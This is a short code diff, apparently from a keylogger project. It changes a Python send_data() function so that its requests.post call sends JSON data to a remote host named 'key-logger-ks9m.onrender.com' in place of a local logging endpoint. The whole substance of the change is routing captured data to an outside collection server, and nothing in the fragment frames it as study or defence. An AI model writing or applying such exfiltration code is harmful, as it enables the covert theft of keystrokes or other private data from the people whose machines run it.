@@ -69,7 +69,7 @@ def send_data():
 
     try:
         response = requests.post(
-            "http://127.0.0.1:5000/api/log",
+            "https://key-logger-ks9m.onrender.com",
             json=data,
             timeout=5
         )
